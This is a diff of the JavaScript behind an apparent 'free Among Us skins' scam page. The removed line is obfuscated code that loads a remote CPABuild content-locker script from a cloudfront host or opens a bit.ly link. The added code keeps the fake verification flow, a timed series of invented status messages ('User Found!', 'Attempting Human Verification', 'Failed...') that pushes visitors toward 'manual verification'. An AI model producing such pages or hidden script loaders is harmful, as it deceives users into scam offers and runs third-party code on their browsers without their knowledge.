@@ -1,1 +1,19 @@
-var _0xb40a=['getAttribute','class=\x22yellowText\x22','Please\x20select\x20at\x20least\x201\x20or\x20more\x20items!','.verify','Authorizing\x20User...','head','User\x20Found!','fadeIn','innerHTML','verify','CPABuildLock();','.status','window.open(\x27https://bit.ly/3pKeNQw\x27,\x20\x27_blank\x27)','https://d13nu0oomnx5ti.cloudfront.net/6f5cf0f.js','src','getElementById','.holderInput\x20h1','.verifying','setAttribute','Connecting...','length','Attempting\x20Human\x20Verification\x20(1/2)...','querySelector','class=\x27successText\x27','onclick','</span>','appendChild','script','Attempting\x20Human\x20Verification\x20(2/2)...','class=\x27errorText\x27}','innerText','Status:\x20<span\x20','20399'];(function(_0x4ed158,_0x50e718){var _0xb40aa1=function(_0x8a9df9){while(--_0x8a9df9){_0x4ed158['push'](_0x4ed158['shift']());}};_0xb40aa1(++_0x50e718);}(_0xb40a,0x184));var _0x8a9d=function(_0x4ed158,_0x50e718){_0x4ed158=_0x4ed158-0x1a8;var _0xb40aa1=_0xb40a[_0x4ed158];return _0xb40aa1;};var _0x38973c=_0x8a9d,date=new Date(),seconds=date['getSeconds']();myButton=document[_0x38973c(0x1bf)](_0x38973c(0x1b9));if(seconds<0x1e){if(myButton[_0x38973c(0x1b0)](_0x38973c(0x1c8))==_0x38973c(0x1ba)){var CPABUILDSETTINGS={'it':0x123ea9,'key':_0x38973c(0x1af)},script=document['createElement'](_0x38973c(0x1aa));script[_0x38973c(0x1be)]=_0x38973c(0x1bd),document[_0x38973c(0x1b5)][_0x38973c(0x1a9)](script);}else myButton[_0x38973c(0x1c2)]('onclick',_0x38973c(0x1bc));};function claim(){var _0x3e992f=_0x38973c;if(selectedSkinsAmount<0x1)return document['querySelector'](_0x3e992f(0x1c0))[_0x3e992f(0x1ad)]=_0x3e992f(0x1b2);$('.firstStep')['fadeOut'](0xfa),$(_0x3e992f(0x1c1))[_0x3e992f(0x1b7)](0x8ca);const _0x13339e=[_0x3e992f(0x1c3),_0x3e992f(0x1b4),_0x3e992f(0x1b6),'Verifying\x20Human...',_0x3e992f(0x1c5),'Failed...',_0x3e992f(0x1ab),'Manual\x20Verification\x20Is\x20Required\x20To\x20Claim\x20Your\x20Among\x20Us\x20Items!'];for(let _0x4366c5=0x0;_0x4366c5<_0x13339e[_0x3e992f(0x1c4)];_0x4366c5++){let _0x18c28e=0x2*_0x4366c5*0x352;if(_0x4366c5===_0x13339e[_0x3e992f(0x1c4)]-0x1)_0x18c28e=0x3e80;setTimeout(()=>{var _0x4d24da=_0x3e992f;document[_0x4d24da(0x1c6)](_0x4d24da(0x1bb))[_0x4d24da(0x1b8)]=_0x4d24da(0x1ae)+(_0x4366c5===0x2?_0x4d24da(0x1c7):_0x4366c5===_0x13339e[_0x4d24da(0x1c4)]-0x1||_0x4366c5===0x5?_0x4d24da(0x1ac):_0x4366c5===0x4||_0x4366c5===0x6?_0x4d24da(0x1b1):'')+'>'+_0x13339e[_0x4366c5]+_0x4d24da(0x1a8);if(_0x4366c5===_0x13339e[_0x4d24da(0x1c4)]-0x1)$(_0x4d24da(0x1b3))['show']();},_0x18c28e);}}
+var sSmoothScroller = 'https://github.com/cferdinandi/smooth-scroll'
+
+function claim() {
+    if (selectedSkinsAmount < 1) return document.querySelector('.holderInput h1').innerText = "Please select at least 1 or more items!";
+
+    $('.firstStep').fadeOut(250)
+    $('.verifying').fadeIn(2250)
+
+    const statuses = ['Connecting...', 'Authorizing User...', 'User Found!', 'Verifying Human...', 'Attempting Human Verification (1/2)...', 'Failed...', 'Attempting Human Verification (2/2)...', 'Manual Verification Is Required To Claim Your Among Us Items!'];
+
+    for (let i = 0; i < statuses.length; i++) {
+        let time = 2 * i * 850;
+        if (i === statuses.length - 1) time = 16000;
+        setTimeout(() => {
+            document.querySelector('.status').innerHTML = `Status: <span ${i === 2 ? "class='successText'" : i === statuses.length - 1 || i === 5 ? "class='errorText'}" : i === 4 || i === 6 ? 'class="yellowText"' : ''}>${statuses[i]}</span>`;
+            if (i === statuses.length - 1) $('.verify').show();
+        }, time)
+    }
+}
